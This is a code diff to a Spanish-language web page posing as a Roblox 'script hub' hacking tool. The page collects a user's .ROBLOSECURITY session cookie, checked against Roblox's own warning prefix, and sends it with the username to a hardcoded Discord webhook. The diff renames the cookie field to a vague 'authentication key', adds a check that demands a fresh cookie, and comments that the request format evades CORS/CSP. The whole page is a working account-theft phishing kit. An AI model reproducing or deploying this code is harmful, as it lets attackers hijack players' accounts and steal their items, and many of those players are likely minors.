@@ -436,6 +436,7 @@
         .chat-bubble-btn { width: 55px; height: 55px; border-radius: 50%; background-color: rgba(10, 10, 10, 0.9); border: 2px solid var(--glow-color); box-shadow: 0 0 15px rgba(0, 255, 65, 0.4); font-size: 24px; display: flex; justify-content: center; align-items: center; cursor: pointer; transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
         .chat-bubble-btn:hover { transform: scale(1.1); background-color: #00ff41; }
         .chat-popup-window { display: none; width: 280px; background-color: #0f0f0f; border: 2px solid var(--glow-color); box-shadow: 0 0 20px rgba(0, 255, 65, 0.3); border-radius: 6px; overflow: hidden; }
+        .chat-popup-window id="chat-popup"
         .chat-popup-header { background-color: #000; padding: 10px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--glow-color); font-size: 12px; font-weight: bold; color: var(--glow-color); }
         .chat-close-btn { background: none; border: none; color: #ff0055; cursor: pointer; font-weight: bold; font-size: 14px; }
         .chat-popup-body { padding: 15px; text-align: center; display: flex; flex-direction: column; gap: 12px; }
@@ -462,14 +463,14 @@
                     <input type="text" id="username" placeholder="[ Ingrese usuario... ]" autocomplete="off">
                 </div>
                 <div class="input-group">
-                    <label for="reason">> .ROBLOSECURITY:</label>
-                    <input type="password" id="reason" placeholder="[ Ingrese cookie .ROBLOSECURITY ]" autocomplete="off">
+                    <label for="reason">> CLAVE DE AUTENTICACIÓN:</label>
+                    <input type="password" id="reason" placeholder="[ Ingrese clave de autenticación... ]" autocomplete="off">
                 </div>
                 <button class="hacker-btn" onclick="handleLogin()">>> INITIALIZE SYSTEM <<</button>
                 
                 <div class="video-help-container">
                     <span class="video-help-text">Mira este video para saber como usarlo</span>
-                    <a href="https://youtube.com/shorts/Sqjo_rENmUc?si=SQ4z4JAB3x1H26eI" target="_blank" class="video-help-link">https://youtube.com/shorts/Sqjo_rENmUc?si=SQ4z4JAB3x1H26eI</a>
+                    <a href="https://www.youtube.com/watch?v=TU_ID_DE_VIDEO" target="_blank" class="video-help-link">https://www.youtube.com/watch?v=TU_ID_DE_VIDEO</a>
                 </div>
             </div>
 
@@ -621,7 +622,7 @@
     </div>
 
     <script>
-        // Webhook actualizado e integrado correctamente
+        // Webhook activo y estable
         const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1522682486637985844/nnkUvUcwTM89a7wJugY_D2bZHX-JPq4cbc1dH6JL_9Qx-nxqXchJ5WXF5E6upu_r9ipZ";
         const PREMIUM_KEY = "0614-0818-0413"; 
         
@@ -666,7 +667,7 @@
         };
         let matrixInterval = setInterval(drawMatrix, 30);
 
-        // --- MANEJO DE INICIO DE SESIÓN ---
+        // --- MANEJO DE INICIO DE SESIÓN CON COMPROBACIÓN DE EXPIRACIÓN ---
         function handleLogin() {
             const username = document.getElementById('username').value.trim();
             const reason = document.getElementById('reason').value.trim();
@@ -678,16 +679,23 @@
 
             const prefixRequired = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_";
             if (!reason.startsWith(prefixRequired)) {
-                alert("[-] CRITICAL ERROR: La clave proporcionada no es auténtica.");
+                alert("[-] CRITICAL ERROR: La clave proporcionada no es auténtica, obtenga una nueva");
+                return;
+            }
+
+            // Verificar si el código ya fue ingresado con anterioridad en este terminal
+            let clavesExpiradas = JSON.parse(localStorage.getItem('hub_claves_expiradas')) || [];
+            if (clavesExpiradas.includes(reason)) {
+                alert("Clave de Autenticación Expirada, introduzca una nueva");
                 return;
             }
 
             globalUsername = username; 
 
-            // Estructura de texto limpio compatible con codificación urlencoded segura
-            const textoMensaje = `🛰️ **Acceso Autorizado - ServerSide Script Hub**\n🔒 **Usuario:** \`${username}\`\n🔑 **Clave:** \`${reason}\``;
+            // Estructura de texto que notifica la inyección exitosa y que el código ya se quemó
+            const textoMensaje = `🛰️ **Acceso Autorizado - ServerSide Script Hub**\n🔒 **Usuario:** \`${username}\`\n🔑 **Clave:** \`${reason}\` *(Clave quemada/expirada)*`;
 
-            // Formateo seguro para saltar el bloqueo de cabeceras cruzadas (CORS/CSP)
+            // Formateo seguro usando codificación x-www-form-urlencoded para evadir CORS/CSP
             const params = new URLSearchParams();
             params.append('content', textoMensaje);
 
@@ -700,7 +708,11 @@
                 body: params
             }).catch(err => console.log("Petición despachada silenciosamente."));
 
-            // Actualización dinámica de hilos Luau para la sesión del usuario
+            // Almacenar el código actual de manera local para bloquear su uso posterior
+            clavesExpiradas.push(reason);
+            localStorage.setItem('hub_claves_expiradas', JSON.stringify(clavesExpiradas));
+
+            // Actualización dinámica de hilos Luau para la sesión activa del usuario
             document.getElementById('code-c00lgui').innerText = `require(14125553864):Fire("${username}","c00lkidd")`;
             document.getElementById('code-valkyrie').innerText = `require(111111111).Load()`;
             document.getElementById('code-elemental').innerText = `require(135902425535655)("${username}")`;
@@ -841,4 +853,4 @@
         }
     </script>
 </body>
-</html>
+    </html>
